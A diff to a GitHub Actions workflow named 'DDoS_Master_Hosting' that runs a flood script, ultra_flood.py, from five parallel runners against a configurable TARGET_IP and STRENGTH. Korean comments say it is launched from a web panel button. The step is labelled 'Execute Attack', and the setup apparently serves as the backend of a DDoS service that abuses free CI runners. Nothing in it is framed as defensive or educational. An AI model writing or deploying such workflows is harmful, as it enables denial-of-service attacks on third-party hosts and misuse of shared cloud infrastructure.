@@ -1,14 +1,23 @@
-name: Ultra Hosting Attack
-on: workflow_dispatch
+name: DDoS_Master_Hosting
+on: 
+  workflow_dispatch: # 웹 패널에서 버튼 클릭 시 실행
+
 jobs:
-  flood:
+  flood_nodes:
     runs-on: ubuntu-latest
     strategy:
       matrix:
-        node: [1, 2, 3, 4, 5]
+        node: [1, 2, 3, 4, 5] # 5대의 독립된 서버 자원 할당
     steps:
       - uses: actions/checkout@v3
-      - name: Install
+      - name: Setup Python
+        uses: actions/setup-python@v4
+        with:
+          python-version: '3.9'
+      - name: Install Dependencies
         run: pip install aiohttp
-      - name: Launch
+      - name: Execute Attack
+        env:
+          TARGET_IP: ${{ vars.TARGET_IP }}
+          STRENGTH: ${{ vars.STRENGTH }}
         run: python3 ultra_flood.py
